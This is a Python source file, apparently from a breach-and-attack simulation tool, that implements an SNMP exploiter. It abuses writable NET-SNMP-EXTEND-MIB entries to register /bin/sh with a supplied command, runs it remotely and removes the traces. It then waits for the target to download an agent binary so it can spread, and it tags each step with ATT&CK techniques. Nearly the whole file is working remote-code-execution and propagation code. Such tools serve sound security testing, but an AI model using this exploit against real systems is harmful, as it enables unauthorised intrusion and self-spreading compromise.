from dataclasses import dataclass
from ipaddress import IPv4Address
from logging import getLogger
from os.path import dirname
from time import time
from typing import Iterator, Tuple

from pysnmp.hlapi import (
    CommunityData,
    ContextData,
    ObjectIdentity,
    ObjectType,
    SnmpEngine,
    UdpTransportTarget,
    getCmd,
    setCmd,
)
from pysnmp.smi import builder

from common.agent_events import ExploitationEvent, PropagationEvent
from common.event_queue import IAgentEventPublisher
from common.tags.attack import (
    EXPLOITATION_FOR_CLIENT_EXECUTION_T1203_TAG,
    EXPLOITATION_OF_REMOTE_SERVICES_T1210_TAG,
    INGRESS_TOOL_TRANSFER_T1105_TAG,
)
from common.types import AgentID, Event
from infection_monkey.i_puppet import TargetHost

from .snmp_options import SNMPOptions

COMMAND_NAME = "command0"

logger = getLogger(__name__)


@dataclass
class SNMPResult:
    errorIndication: str  # True value indicates SNMP engine error
    errorStatus: str  # True value indicates SNMP PDU error
    errorIndex: int  # If nonzero, PDU error index for varBinds[errorIndex-1]
    varBinds: Tuple[ObjectType]  # MIB variables returned in SNMP response


SNMP_EXPLOITER_TAG = "snmp-exploiter"
EXPLOITATION_TAGS = (
    SNMP_EXPLOITER_TAG,
    EXPLOITATION_FOR_CLIENT_EXECUTION_T1203_TAG,
    EXPLOITATION_OF_REMOTE_SERVICES_T1210_TAG,
)
PROPAGATION_TAGS = (SNMP_EXPLOITER_TAG, INGRESS_TOOL_TRANSFER_T1105_TAG)


class SNMPExploitClient:
    def __init__(
        self,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        exploiter_name: str,
    ):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._exploiter_name = exploiter_name
        self._engine = SnmpEngine()

        mib_builder = self._engine.getMibBuilder()
        mib_builder.addMibSources(builder.DirMibSource(dirname(__file__)))

    def exploit_host(
        self,
        host: TargetHost,
        community_string: str,
        command: str,
        agent_binary_downloaded: Event,
        options: SNMPOptions,
    ) -> Tuple[bool, bool]:
        """
        Exploit the host using SNMP

        :param host: The host to exploit
        :param community_string: The community string to use
        :param command: The command to execute
        :param agent_binary_downloaded: An event that will be set when the agent binary is
            downloaded
        :raises: Exception if the exploit fails
        """
        exploitation_message = ""
        exploitation_success = True

        timestamp = time()
        try:
            self._set_command(host.ip, COMMAND_NAME, community_string, command)
            self._execute_command(host.ip, COMMAND_NAME, community_string)
            self._clear_command(host.ip, COMMAND_NAME, community_string)
        except Exception as err:
            exploitation_message = f"{err}"
            exploitation_success = False

        propagation_success = self._evaluate_propagation_success(
            exploitation_success, agent_binary_downloaded, options.agent_binary_download_timeout
        )

        self._publish_exploitation_event(
            host, timestamp, exploitation_success, exploitation_message
        )
        self._publish_propagation_event(host, timestamp, propagation_success)

        return exploitation_success, propagation_success

    def _set_command(
        self, target_ip: IPv4Address, command_name: str, community_string: str, command: str
    ):
        cmd = setCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget((str(target_ip), 161)),
            ContextData(),
            ObjectType(
                ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendStatus", f'"{command_name}"'),
                "createAndGo",
            ),
            ObjectType(
                ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendCommand", f'"{command_name}"'),
                "/bin/sh",
            ),
            ObjectType(
                ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendArgs", f'"{command_name}"'),
                command,
            ),
        )
        self._dispatch(cmd)

    def _execute_command(self, target_ip: IPv4Address, command_name: str, community_string: str):
        # Other potential NET-SNMP-EXTEND-MIB options:
        # - nsExtendStatus
        # - nsExtendOutput1Line
        # - nsExtendOutputFull
        # - nsExtendOutNumLines
        # - nsExtendOutLine
        cmd = getCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget((str(target_ip), 161)),
            ContextData(),
            ObjectType(ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendNumEntries", 0)),
            ObjectType(
                ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendCommand", f'"{command_name}"')
            ),
            ObjectType(ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendArgs", f'"{command_name}"')),
            ObjectType(ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendInput", f'"{command_name}"')),
            ObjectType(
                ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendResult", f'"{command_name}"')
            ),
        )
        self._dispatch(cmd)

    def _clear_command(self, target_ip: IPv4Address, command_name: str, community_string: str):
        cmd = setCmd(
            self._engine,
            CommunityData(community_string),
            UdpTransportTarget((str(target_ip), 161)),
            ContextData(),
            ObjectType(
                ObjectIdentity("NET-SNMP-EXTEND-MIB", "nsExtendStatus", f'"{command_name}"'),
                "destroy",
            ),
        )
        self._dispatch(cmd)

    def _dispatch(self, command_iterator: Iterator[Tuple]):
        result = SNMPResult(*next(command_iterator))

        if result.errorIndication:
            raise Exception(f"Failed to execute command: {result.errorIndication}")
        elif result.errorStatus:
            raise Exception(f"Failed to execute command: {result.errorStatus}")

    def _publish_exploitation_event(
        self, host: TargetHost, timestamp: float, success: bool, message: str
    ):
        self._agent_event_publisher.publish(
            ExploitationEvent(
                source=self._agent_id,
                target=host.ip,
                timestamp=timestamp,
                tags=frozenset(EXPLOITATION_TAGS),
                success=success,
                exploiter_name=self._exploiter_name,
                error_message=message,
            )
        )

    def _publish_propagation_event(self, host: TargetHost, timestamp: float, success: bool):
        self._agent_event_publisher.publish(
            PropagationEvent(
                source=self._agent_id,
                target=host.ip,
                timestamp=timestamp,
                tags=frozenset(PROPAGATION_TAGS),
                success=success,
                exploiter_name=self._exploiter_name,
            )
        )

    @staticmethod
    def _evaluate_propagation_success(
        exploitation_success: bool,
        agent_binary_downloaded: Event,
        agent_binary_download_timeout: float,
    ) -> bool:
        if not exploitation_success:
            return False

        logger.debug("Waiting for the target to download the agent binary...")
        agent_binary_downloaded.wait(agent_binary_download_timeout)

        return agent_binary_downloaded.is_set()
